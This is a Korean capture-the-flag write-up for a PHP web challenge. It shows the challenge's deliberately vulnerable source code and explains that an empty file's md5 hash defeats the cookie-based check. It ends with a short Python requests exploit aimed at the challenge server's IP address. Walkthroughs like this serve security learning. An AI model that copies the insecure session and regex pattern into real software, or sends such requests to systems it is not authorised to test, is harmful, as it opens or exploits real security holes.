======================================================
[2017_h3x0r] [WEB] file with php
======================================================

문제 내용
======================================================

http://13.124.93.183/h3x0rctf/d41d8cd98f00b204e9800998ecf8427e.php


문제 풀이
======================================================

해당 사이트에 접속해보면 Blank Page. LoL이라고 뜨고 있는데, 쿠키값을 확인해보면 source라는 값이 0으로 존재한다. 해당 값을 1로 수정하면 다음과 같은 php 소스코드를 확인할 수 있다.

.. code-block:: php

    <?php
        
        $flag = 1;
        include "config.php";
        
        $_SESSION[cookie] = $_COOKIE[PHPSESSID];

        if($_GET['mode']=="pwn") {

            $f=file("$_SESSION[cookie].txt");
            
            if(preg_match("/^$_SESSION[cookie]$/i", md5($f[0]))) {
                unlink("$_SESSION[cookie].txt");
                echo $flag;
            }
        
            $f = fopen(md5($_SESSION[cookie]).".txt", "w");
            fwrite($f,$_SESSION[cookie]);
            fclose($f);
            usleep(300000);
            unlink(md5($_SESSION[cookie]).".txt");
        }

        if($_COOKIE['source']) {
            show_source(__FILE__);
            exit();
        }
        
        setcookie('source', 0);
        echo "<h3> Blank Page. LoL </h3>";
    ?>


문제를 볼 때 항상 입력값과 출력값을 염두해두자. 입력값은 mode 파라미터와 PHPSESSID 쿠키 값이고, 출력하고자하는 값은 flag 변수이다.
출력 값인 flag 변수 내용을 가져오기 위해서는, 조건문이 2개 맞아야 한다.

1. mode 파라미터가 pwn이어야 한다.
2. f변수의 0번째 값을 md5한 값이 PHPSESSID 쿠키 값과 일치해야 한다.

f변수는 PHPSESSID 쿠키 값으로 파일을 생성하는데, 최초 생성이기에 해당 array에는 아무 내용도 없을 것이다. 
그 때문에 $f[0]=""일 것이고, md5($f[0])=d41d8cd98f00b204e9800998ecf8427e 일 것이다.


다음과 같은 python 코드를 통해 플래그를 획득한다.

.. code-block:: python

    import requests

    url = "http://13.124.93.183/h3x0rctf/d41d8cd98f00b204e9800998ecf8427e.php?mode=pwn"
    header = {
        "Cookie":"PHPSESSID=d41d8cd98f00b204e9800998ecf8427e"
    }
    r = requests.get(url,headers=header)
    print r.content
